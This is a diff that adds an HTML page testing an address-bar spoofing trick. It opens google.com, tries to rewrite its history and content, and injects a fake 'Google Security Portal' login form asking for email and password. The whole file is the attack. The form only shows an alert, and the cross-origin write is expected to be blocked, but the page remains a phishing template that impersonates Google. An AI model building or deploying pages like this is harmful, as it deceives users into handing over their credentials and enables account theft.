@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick="historySpoof()">History API Method</button>
+
+<script>
+function historySpoof() {
+    const win = window.open("https://www.google.com", "_blank");
+    
+    setTimeout(() => {
+        try {
+            // Coba manipulasi history state
+            win.history.pushState({}, "", "https://www.google.com");
+            
+            win.document.write(`
+                <h1>Google Security Portal</h1>
+                <div style="font-family: Arial;">
+                    <p>Your account requires verification</p>
+                    <input type="email" placeholder="Email" id="email">
+                    <input type="password" placeholder="Password" id="pass">
+                    <button onclick="login()">Verify</button>
+                </div>
+                <script>
+                    function login() {
+                        const e = document.getElementById('email').value;
+                        const p = document.getElementById('pass').value;
+                        alert('Processing: ' + e);
+                    }
+                <\/script>
+            `);
+            win.document.close();
+        } catch(e) {
+            console.log("History API blocked");
+        }
+    }, 200);
+}
+</script>
+</body>
+</html>
